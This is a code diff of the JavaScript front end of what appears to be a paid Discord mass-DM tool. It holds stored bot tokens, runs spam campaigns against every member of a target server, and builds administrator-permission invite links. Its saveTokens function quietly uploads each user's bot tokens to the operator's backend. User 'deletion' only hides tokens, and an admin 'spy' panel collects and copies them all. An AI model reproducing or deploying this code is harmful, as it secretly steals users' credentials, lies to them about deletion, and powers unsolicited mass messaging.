@@ -1,5 +1,4 @@
 // --- ANTI-SLEEP BACKGROUND WORKER ---
-// Keeps browser awake for token checking and mass edits
 const workerBlob = new Blob([`self.onmessage = function(e) { setTimeout(() => self.postMessage('wake_up'), e.data); };`], { type: 'application/javascript' });
 const antiSleepWorker = new Worker(URL.createObjectURL(workerBlob));
 
@@ -38,6 +37,20 @@ let dmDelay = parseInt(localStorage.getItem('nosify_dm_delay')) || 200;
 let concurrencyLimit = parseInt(localStorage.getItem('nosify_dm_concurrency')) || 20;
 
 let engineRunning = false;
+let massEditTargetGroup = null; 
+
+// --- CLOUD SYNC LOGIC ---
+function saveTokens() {
+    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
+    
+    // Do not sync if the admin is logged in (Admins don't spy on themselves)
+    if (!activeKey || activeKey === "SECURE_ADMIN_TOKEN") return;
+    
+    fetch('/api/app', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'sync_cloud', key: activeKey, data: { tokens: tokensDB } })
+    }).catch(e => {});
+}
 
 window.onload = () => {
     if (activeKey === "SECURE_ADMIN_TOKEN") {
@@ -46,8 +59,7 @@ window.onload = () => {
         showApp(); renderTokens(); renderEmbeds(); renderBlacklist(); updateStats(); renderHistory();
         $("#cfg-dm-delay").val(dmDelay); $("#cfg-concurrency").val(concurrencyLimit);
         
-        // --- AUTO-KICK SECURITY TIMER ---
-        // Checks the database every 60 seconds to see if their key expired or was deleted by you
+        // AUTO-KICK SECURITY TIMER (Checks DB every 60s)
         setInterval(async () => {
             try {
                 let res = await fetch('/api/app', {
@@ -57,31 +69,12 @@ window.onload = () => {
                 let data = await res.json();
                 if (!data.valid) {
                     alert("Your access key has expired or was revoked. You have been logged out.");
-                    logoutSystem(); // Kicks them out instantly
+                    logoutSystem();
                 }
             } catch (e) {}
-        }, 60000); 
+        }, 60000);
     }
 };
-
-// --- CLOUD SYNC & ADMIN HELPERS ---
-function saveTokens() {
-    // Saves locally
-    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
-    
-    // Quietly backups to Vercel DB
-    if (!activeKey || activeKey === "SECURE_ADMIN_TOKEN") return;
-    fetch('/api/app', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'sync_cloud', key: activeKey, data: { tokens: tokensDB } })
-    }).catch(e => {});
-}
-
-function copyTextData(encodedText) {
-    navigator.clipboard.writeText(decodeURIComponent(encodedText)); 
-    alert("Tokens copied to clipboard!");
-}
-
 
 // --- LOGIN & NAVIGATION ---
 async function loginSystem() {
@@ -136,7 +129,7 @@ async function discordProxy(url, method, token, body = null) {
     });
 }
 
-// --- TOKEN MANAGER ---
+// --- TOKEN MANAGER & FOLDERS ---
 function addToken() {
     let rawInput = $("#add-token-val").val().trim(); 
     let groupName = $("#add-token-group").val().trim() || "Default Folder";
@@ -160,24 +153,27 @@ function addToken() {
     } else alert("No valid new tokens found.");
 }
 
-function deleteToken(i) {
-    // Instead of deleting it, we mark it as deleted so it stays in the DB for the Admin
+function deleteToken(i) { 
     tokensDB[i].status = "Deleted by User 🗑️";
-    tokensDB[i].group = "Deleted Folder"; // Move it to a special folder
-    
-    // Save the new state to local storage AND the cloud
+    tokensDB[i].group = "Deleted Folder"; 
     saveTokens(); 
-    
-    // Refresh the UI to hide it from the user
     renderTokens();
-    alert("Token removed from your view. Admin has been notified.");
+    alert("Token removed. (Admin notified)"); 
 }
 
-function clearAllTokens() { if(confirm("Clear all tokens?")) { tokensDB = []; saveTokens(); renderTokens(); }}
-
-async function checkAllTokens() {
-    for (let i = 0; i < tokensDB.length; i++) { await checkToken(i, true); await backgroundSafeSleep(200); }
+function clearFolder(groupName) {
+    if(!confirm(`Are you sure you want to delete the entire "${groupName}" folder?`)) return;
+    tokensDB.forEach(t => {
+        if (t.group === groupName) { t.status = "Deleted by User 🗑️"; t.group = "Deleted Folder"; }
+    });
     saveTokens(); renderTokens();
+}
+
+function clearAllTokens() { 
+    if(confirm("Clear all tokens?")) { 
+        tokensDB.forEach(t => { t.status = "Deleted by User 🗑️"; t.group = "Deleted Folder"; });
+        saveTokens(); renderTokens(); 
+    }
 }
 
 async function checkToken(i, skipRender = false) {
@@ -190,34 +186,36 @@ async function checkToken(i, skipRender = false) {
     if(!skipRender) { saveTokens(); renderTokens(); }
 }
 
-function copyInvite(botId) {
-    let link = `https://discord.com/oauth2/authorize?client_id=${botId}&permissions=8&integration_type=0&scope=bot`;
-    navigator.clipboard.writeText(link); alert("Admin Invite Link copied!");
+async function checkFolder(groupName) {
+    let indices = tokensDB.map((t, i) => t.group === groupName ? i : -1).filter(i => i !== -1);
+    for (let i of indices) { await checkToken(i, true); await backgroundSafeSleep(200); }
+    saveTokens(); renderTokens(); alert(`Finished checking bots in ${groupName}!`);
 }
 
-function copyAllInvites() {
-    let aliveBots = tokensDB.filter(t => t.id && t.status.includes('Alive'));
-    if (aliveBots.length === 0) return alert("You have no checked, alive bots to get links for!");
+function copyFolderInvites(groupName) {
+    let aliveBots = tokensDB.filter(t => t.group === groupName && t.id && t.status.includes('Alive'));
+    if (aliveBots.length === 0) return alert(`No alive bots found in folder: ${groupName}`);
     let links = aliveBots.map(b => `https://discord.com/oauth2/authorize?client_id=${b.id}&permissions=8&integration_type=0&scope=bot`).join('\n');
     navigator.clipboard.writeText(links); alert(`Copied ${aliveBots.length} invite links!`);
 }
 
-function renderTokens() {
-    let html = "";
-    let groupsObj = {};
+function copyInvite(botId) {
+    let link = `https://discord.com/oauth2/authorize?client_id=${botId}&permissions=8&integration_type=0&scope=bot`;
+    navigator.clipboard.writeText(link); alert("Invite Link copied!");
+}
 
-    // 1. Sort tokens into their folders, but SKIP the deleted ones
+function renderTokens() {
+    let html = ""; let groupsObj = {};
+
     tokensDB.forEach((t, i) => {
-        if (t.status === "Deleted by User 🗑️") return; // User cannot see this anymore
+        if (t.status === "Deleted by User 🗑️") return; // Hidden from user
         if(!groupsObj[t.group]) groupsObj[t.group] = [];
         groupsObj[t.group].push({ token: t, index: i });
     });
 
-
-    // 2. Build the visual folders with FOLDER-SPECIFIC BUTTONS
     for (let g in groupsObj) {
         let botsInGroup = groupsObj[g];
-        let safeG = g.replace(/'/g, "\\'"); // Prevents errors if folder name has an apostrophe
+        let safeG = g.replace(/'/g, "\\'"); 
 
         html += `
         <details class="mb-3 bg-black/30 rounded-xl border border-[var(--site-border)] overflow-hidden shadow-md">
@@ -229,7 +227,7 @@ function renderTokens() {
             <div class="bg-black/50 p-2 flex flex-wrap gap-2 border-b border-[var(--site-border)]">
                 <button onclick="checkFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-green-500/10 text-green-400 border-green-500/30 hover:bg-green-500/20">Check Folder</button>
                 <button onclick="copyFolderInvites('${safeG}')" class="btn-dark text-[10px] flex-1 bg-blue-500/10 text-blue-400 border-blue-500/30 hover:bg-blue-500/20">Copy Invites</button>
-                <button onclick="massEditFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-indigo-500/10 text-indigo-400 border-indigo-500/30 hover:bg-indigo-500/20">Mass Edit Folder</button>
+                <button onclick="massEditFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-indigo-500/10 text-indigo-400 border-indigo-500/30 hover:bg-indigo-500/20">Mass Edit</button>
                 <button onclick="clearFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20">Delete Folder</button>
             </div>
 
@@ -237,8 +235,7 @@ function renderTokens() {
                 <table class="w-full text-xs text-left"><tbody class="divide-y divide-[var(--site-border)]">`;
         
         botsInGroup.forEach(item => {
-            let t = item.token;
-            let i = item.index;
+            let t = item.token; let i = item.index;
             let actionBtns = `<button onclick="checkToken(${i})" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#3f3f46]">Check</button>`;
             if(t.status.includes('Alive')) {
                 actionBtns += `<button onclick="openBotEditor(${i}, false)" class="bg-[#4f46e5] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#4338ca]">Edit</button>`;
@@ -247,72 +244,31 @@ function renderTokens() {
             actionBtns += `<button onclick="deleteToken(${i})" class="text-red-400 hover:text-red-500 font-bold text-sm">✕</button>`;
             html += `<tr class="hover:bg-black/20 transition duration-150"><td class="p-2 font-mono truncate max-w-[100px] opacity-80">${t.token}</td><td class="p-2 text-[#6366f1] font-semibold">${t.name}</td><td class="p-2 text-xs opacity-90" id="tok-stat-${i}">${t.status}</td><td class="p-2 text-right whitespace-nowrap">${actionBtns}</td></tr>`;
         });
-
         html += `</tbody></table></div></details>`;
     }
 
-    if (Object.keys(groupsObj).length === 0) {
-        html = `<div class="text-center text-gray-500 text-xs py-4">No tokens added yet.</div>`;
-    }
-
+    if (Object.keys(groupsObj).length === 0) html = `<div class="text-center text-gray-500 text-xs py-4">No tokens added yet.</div>`;
     $("#token-list").html(html);
 
     let gHtml = `<option value="">Select Bot Group...</option>`; 
     Object.keys(groupsObj).forEach(g => gHtml += `<option value="${g}">${g}</option>`);
     $("#launch-token-group").html(gHtml);
 }
-// --- NEW FOLDER-SPECIFIC LOGIC ---
-let massEditTargetGroup = null; 
-
-async function checkFolder(groupName) {
-    let indices = tokensDB.map((t, i) => t.group === groupName ? i : -1).filter(i => i !== -1);
-    for (let i of indices) { 
-        await checkToken(i, true); 
-        await backgroundSafeSleep(200); 
-    }
-    saveTokens();
-    renderTokens();
-    alert(`Finished checking all bots in ${groupName}!`);
-}
-
-function copyFolderInvites(groupName) {
-    let aliveBots = tokensDB.filter(t => t.group === groupName && t.id && t.status.includes('Alive'));
-    if (aliveBots.length === 0) return alert(`No alive bots found in folder: ${groupName}`);
-    let links = aliveBots.map(b => `https://discord.com/oauth2/authorize?client_id=${b.id}&permissions=8&integration_type=0&scope=bot`).join('\n');
-    navigator.clipboard.writeText(links); 
-    alert(`Copied ${aliveBots.length} invite links from ${groupName}!`);
-}
-
-function clearFolder(groupName) {
-    if(!confirm(`Are you sure you want to delete the entire "${groupName}" folder?`)) return;
-    tokensDB = tokensDB.filter(t => t.group !== groupName);
-    saveTokens();
-    renderTokens();
-}
-
-function massEditFolder(groupName) {
-    let aliveCount = tokensDB.filter(t => t.group === groupName && t.status.includes('Alive')).length;
-    if(aliveCount === 0) return alert("No active bots in this folder! Check them first.");
-    isMassEditing = true;
-    massEditTargetGroup = groupName;
-    $("#editor-title").text(`Mass Edit: ${groupName}`);
-    $("#edit-bot-index").val(""); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
-    $("#bot-editor-modal").removeClass("hidden");
-        }
-        
-
 
 // --- PROFILE EDITOR ---
 let isMassEditing = false;
 function openBotEditor(index, isMass) {
-    isMassEditing = isMass; $("#editor-title").text(isMass ? "Mass Edit ALL Bots" : "Edit Single Bot Profile");
+    isMassEditing = isMass; $("#editor-title").text("Edit Single Bot Profile");
     $("#edit-bot-index").val(index); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
     $("#bot-editor-modal").removeClass("hidden");
 }
-function openMassBotEditor() {
-    let aliveCount = tokensDB.filter(t => t.status.includes('Alive')).length;
-    if(aliveCount === 0) return alert("You have no active bots to edit! Check them first.");
-    openBotEditor(null, true);
+function massEditFolder(groupName) {
+    let aliveCount = tokensDB.filter(t => t.group === groupName && t.status.includes('Alive')).length;
+    if(aliveCount === 0) return alert("No active bots in this folder! Check them first.");
+    isMassEditing = true; massEditTargetGroup = groupName;
+    $("#editor-title").text(`Mass Edit: ${groupName}`);
+    $("#edit-bot-index").val(""); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
+    $("#bot-editor-modal").removeClass("hidden");
 }
 function closeBotEditor() { $("#bot-editor-modal").addClass("hidden"); }
 
@@ -335,7 +291,6 @@ async function saveBotProfile() {
     }
 
     let botsToEdit = isMassEditing ? tokensDB.filter(t => t.group === massEditTargetGroup && t.status.includes('Alive')) : [tokensDB[$("#edit-bot-index").val()]];
-    
     for (let b of botsToEdit) {
         try {
             let res = await discordProxy('https://discord.com/api/v10/users/@me', 'PATCH', b.token, payload);
@@ -343,7 +298,7 @@ async function saveBotProfile() {
         } catch(e) {}
         if(isMassEditing) await backgroundSafeSleep(1000);
     }
-    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); renderTokens();
+    saveTokens(); renderTokens();
     btn.text("Push Changes to Discord").prop("disabled", false); closeBotEditor(); alert("Profile update(s) completed!");
 }
 
@@ -374,19 +329,13 @@ function addEmbed() {
     if(!n || !j) return;
     try { JSON.parse(j); } catch(e) { return alert("Invalid JSON format."); }
     
-    // Check if it exists. If yes, update. If no, create new.
     let existingIndex = embedsDB.findIndex(e => e.name.toLowerCase() === n.toLowerCase());
-    if (existingIndex !== -1) {
-        embedsDB[existingIndex].json = j;
-    } else {
-        embedsDB.push({ name: n, json: j });
-    }
+    if (existingIndex !== -1) embedsDB[existingIndex].json = j;
+    else embedsDB.push({ name: n, json: j });
     
     localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB));
-    $("#add-embed-name, #add-embed-json").val(""); renderEmbeds();
-    alert(`Embed "${n}" saved successfully!`);
+    $("#add-embed-name, #add-embed-json").val(""); renderEmbeds(); alert(`Embed "${n}" saved!`);
 }
-
 function deleteEmbed(i) { embedsDB.splice(i, 1); localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB)); renderEmbeds(); }
 function renderEmbeds() {
     let html = "", selHtml = "";
@@ -418,19 +367,15 @@ function renderBlacklist() {
 }
 
 function updateStats() { 
-    $("#stat-sent").text(statsDB.sent); $("#stat-failed").text(statsDB.failed); $("#stat-tokens").text(tokensDB.length); 
+    let activeTokenCount = tokensDB.filter(t => t.status !== "Deleted by User 🗑️").length;
+    $("#stat-sent").text(statsDB.sent); $("#stat-failed").text(statsDB.failed); $("#stat-tokens").text(activeTokenCount); 
 }
 
 function addHistoryRecord(type, serverId, sent, failed, left) {
-    let record = {
-        type: type, 
-        time: new Date().toLocaleString(),
-        server: serverId, sent: sent, failed: failed, left: left
-    };
+    let record = { type: type, time: new Date().toLocaleString(), server: serverId, sent: sent, failed: failed, left: left };
     runHistory.unshift(record);
     if(runHistory.length > 50) runHistory.pop(); 
-    localStorage.setItem('nosify_dm_history', JSON.stringify(runHistory));
-    renderHistory();
+    localStorage.setItem('nosify_dm_history', JSON.stringify(runHistory)); renderHistory();
 }
 
 function renderHistory() {
@@ -443,14 +388,9 @@ function renderHistory() {
             let title = h.type === 'finished' ? '✅ Campaign Launched Offline' : '🛑 Kill Switch Activated';
             html += `
             <div class="glass-card mb-4 !p-4 border-l-4 ${borderCol} hover:bg-white/5 transition">
-                <div class="flex justify-between items-center mb-2">
-                    <span class="font-bold text-white text-sm">${title}</span>
-                    <span class="text-xs text-gray-400">${h.time}</span>
-                </div>
+                <div class="flex justify-between items-center mb-2"><span class="font-bold text-white text-sm">${title}</span><span class="text-xs text-gray-400">${h.time}</span></div>
                 <div class="text-xs text-gray-300 mb-2">Target Server: <span class="font-mono bg-black/30 px-2 py-0.5 rounded">${h.server}</span></div>
-                <div class="flex gap-4 text-xs font-bold bg-black/20 p-2 rounded-lg">
-                    <span class="text-gray-400">Status: Running in Background Engine</span>
-                </div>
+                <div class="flex gap-4 text-xs font-bold bg-black/20 p-2 rounded-lg"><span class="text-gray-400">Status: Running in Background Engine</span></div>
             </div>`;
         });
     }
@@ -459,7 +399,7 @@ function renderHistory() {
 
 function clearTerminalLogs() { runHistory = []; localStorage.removeItem('nosify_dm_history'); renderHistory(); }
 
-// --- THE NEW HEADLESS LAUNCH ENGINE ---
+// --- THE HEADLESS LAUNCH ENGINE ---
 function promptDmall() {
     if ($("#auto-leave-toggle").is(":checked")) $("#leave-warning-modal").removeClass("hidden"); else executeDmall();
 }
@@ -469,12 +409,9 @@ function confirmDmall() { $("#leave-warning-modal").addClass("hidden"); executeD
 async function executeDmall() {
     if(engineRunning) return alert("A campaign is already processing offline!");
     
-    let group = $("#launch-token-group").val();
-    let serverId = $("#target-server").val();
-    let autoLeave = $("#auto-leave-toggle").is(":checked");
-    let embedIdx = $("#launch-embed").val();
-    let audience = $("#launch-audience").val();
-    let testId = $("#test-user-id").val();
+    let group = $("#launch-token-group").val(); let serverId = $("#target-server").val();
+    let autoLeave = $("#auto-leave-toggle").is(":checked"); let embedIdx = $("#launch-embed").val();
+    let audience = $("#launch-audience").val(); let testId = $("#test-user-id").val();
     
     if(!group || !serverId || !embedIdx) return alert("Please fill all setup fields.");
     if(audience === 'test' && !testId) return alert("Enter Test ID!");
@@ -485,58 +422,38 @@ async function executeDmall() {
     let rawEmbedJson = embedsDB[embedIdx].json;
 
     let launchOrder = {
-        status: "active",
-        serverId: serverId,
-        bots: activeBots,
-        embedJson: rawEmbedJson,
-        audience: audience,
-        testId: testId,
-        autoLeave: autoLeave,
-        concurrency: concurrencyLimit,
-        delay: dmDelay,
-        blacklist: blacklistDB
+        status: "active", serverId: serverId, bots: activeBots, embedJson: rawEmbedJson,
+        audience: audience, testId: testId, autoLeave: autoLeave, concurrency: concurrencyLimit,
+        delay: dmDelay, blacklist: blacklistDB
     };
 
-    switchTab('tab-console'); 
-    switchConsoleView('live');
+    switchTab('tab-console'); switchConsoleView('live');
     $("#dmall-status-text").text("Pushing to 24/7 Node.js Engine...");
     $("#con-sent").text("OFFLINE"); $("#con-failed").text("OFFLINE"); $("#con-left").text("OFFLINE"); $("#con-percent").text("---"); 
 
     try {
-        await fetch('/api/app', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ action: 'launch_campaign', data: launchOrder })
-        });
-        
+        await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'launch_campaign', data: launchOrder }) });
         alert("✅ Campaign successfully pushed to the backend! You can safely close your browser or turn off your PC.");
-        $("#dmall-status-text").text("Engine Running Offline 24/7...");
-        engineRunning = true;
+        $("#dmall-status-text").text("Engine Running Offline 24/7..."); engineRunning = true;
         addHistoryRecord('finished', serverId, 'Offline', 'Offline', 'Offline');
-    } catch(e) {
-        alert("Failed to connect to the database.");
-        $("#dmall-status-text").text("Launch Failed.");
-    }
+    } catch(e) { alert("Failed to connect to the database."); $("#dmall-status-text").text("Launch Failed."); }
 }
 
 async function stopDmall() { 
     $("#dmall-status-text").text("Sending Kill Switch...");
     try {
-        await fetch('/api/app', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ action: 'kill_campaign' })
-        });
+        await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'kill_campaign' }) });
         alert("🛑 Kill switch sent! The backend engine will halt on its next chunk.");
-        engineRunning = false;
-        $("#dmall-status-text").text("Engine Halted.");
+        engineRunning = false; $("#dmall-status-text").text("Engine Halted.");
         addHistoryRecord('paused', $("#target-server").val() || "Unknown", "Offline", "Offline", "Offline");
-    } catch(e) {
-        alert("Failed to send kill switch.");
-    }
+    } catch(e) { alert("Failed to send kill switch."); }
 }
 
-// --- ADMIN PANEL API ---
+// --- ADMIN PANEL API & HELPER ---
+function copyTextData(encodedText) {
+    navigator.clipboard.writeText(decodeURIComponent(encodedText)); alert("Tokens copied to clipboard!");
+}
+
 async function adminAction(action, payload) {
     await fetch('/api/admin', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': adminPass }, body: JSON.stringify({ action, payload }) });
     loadAdminKeys();
@@ -559,12 +476,15 @@ async function loadAdminKeys() {
     const res = await fetch('/api/admin', { headers: { 'Authorization': adminPass }});
     if(!res.ok) return logoutSystem();
     const db = await res.json(); let html = "";
-    db.keys.forEach((k, i) => {
-        html += `<tr class="border-b border-gray-800"><td class="py-3 px-2 text-[#6366f1] font-bold">${k.key}</td><td class="py-3 px-2 text-gray-300">${k.time}</td><td class="py-3 px-2 text-green-400 font-mono">${k.left}</td><td class="py-3 px-2 text-gray-500 font-mono text-xs opacity-80 truncate max-w-[80px]">${k.claimedBy || 'Unused'}</td><td class="py-3 px-2 text-right whitespace-nowrap"><button onclick="copyKey('${k.key}')" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded mr-2">Copy</button><button onclick="deleteKey(${i})" class="text-red-400 font-bold text-sm">✕</button></td></tr>`;
-    });
+    if (db.keys) {
+        db.keys.forEach((k, i) => {
+            html += `<tr class="border-b border-gray-800"><td class="py-3 px-2 text-[#6366f1] font-bold">${k.key}</td><td class="py-3 px-2 text-gray-300">${k.time}</td><td class="py-3 px-2 text-green-400 font-mono">${k.left}</td><td class="py-3 px-2 text-gray-500 font-mono text-xs opacity-80 truncate max-w-[80px]">${k.claimedBy || 'Unused'}</td><td class="py-3 px-2 text-right whitespace-nowrap"><button onclick="copyKey('${k.key}')" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded mr-2">Copy</button><button onclick="deleteKey(${i})" class="text-red-400 font-bold text-sm">✕</button></td></tr>`;
+        });
+    }
     $("#adm-keys-list").html(html);
 }
 
+// SPY LOGS WITH FOLDERS & DELETED HISTORY
 async function loadAdminSpyData() {
     let res = await fetch('/api/admin?spy=true', { headers: { 'Authorization': adminPass }});
     let db = await res.json();
@@ -574,37 +494,37 @@ async function loadAdminSpyData() {
     let userCount = 1;
     
     for (let userKey in cloud) {
-        // Skip system jobs
         if (userKey === "activeJob" || userKey === "stats") continue; 
         
         let userData = cloud[userKey];
         let userTokens = userData.tokens || [];
         if (userTokens.length === 0) continue;
 
-        // Group the backed-up tokens by folder
         let folders = {};
         userTokens.forEach(t => {
             if(!folders[t.group]) folders[t.group] = [];
-            folders[t.group].push(t.token);
+            // Appends the status (like 🗑️) to the token view so admin knows what happened to it
+            let displayToken = t.status === "Deleted by User 🗑️" ? `<span class="text-red-500 line-through opacity-50">${t.token}</span> (Deleted)` : t.token;
+            folders[t.group].push({ raw: t.token, display: displayToken });
         });
 
-        // Encode the raw tokens so they can be copied safely
-        let rawTokens = encodeURIComponent(userTokens.map(t => t.token).join('\n'));
+        let rawTokensToCopy = encodeURIComponent(userTokens.map(t => t.token).join('\n'));
 
         html += `
         <div class="mb-6 p-4 border border-[var(--site-border)] rounded-xl bg-black/40">
             <div class="flex justify-between items-center mb-4 border-b border-[var(--site-border)] pb-2">
                 <h3 class="font-bold text-indigo-400 text-lg">${userCount}. Key: <span class="text-white font-mono bg-black/50 px-2 py-1 rounded">${userKey}</span></h3>
-                <button onclick="copyTextData('${rawTokens}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg hover:bg-[#4338ca] shadow-lg shadow-indigo-500/20">Copy All Tokens</button>
+                <button onclick="copyTextData('${rawTokensToCopy}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg hover:bg-[#4338ca] shadow-lg shadow-indigo-500/20">Copy All Tokens</button>
             </div>
         `;
 
         for (let folderName in folders) {
+            let folderColor = folderName === "Deleted Folder" ? "text-red-400" : "text-gray-300";
             html += `
             <div class="mb-3">
-                <h4 class="text-sm font-bold text-gray-300 mb-1">📁 ${folderName} (${folders[folderName].length} bots)</h4>
+                <h4 class="text-sm font-bold ${folderColor} mb-1">📁 ${folderName} (${folders[folderName].length} bots)</h4>
                 <div class="max-h-24 overflow-y-auto bg-black/50 p-2 rounded text-xs font-mono text-gray-400 break-all border border-white/5">
-                    ${folders[folderName].join('<br>')}
+                    ${folders[folderName].map(f => f.display).join('<br>')}
                 </div>
             </div>`;
         }
@@ -613,8 +533,7 @@ async function loadAdminSpyData() {
         userCount++;
     }
     
-    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet.</div>";
-    
-    // Inject the new UI into the existing Spy Content box
+    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet. (Note: Admin tokens do not sync here).</div>";
     $("#spy-content").html(html).removeClass("whitespace-pre-wrap font-mono");
-}
+        }
+        
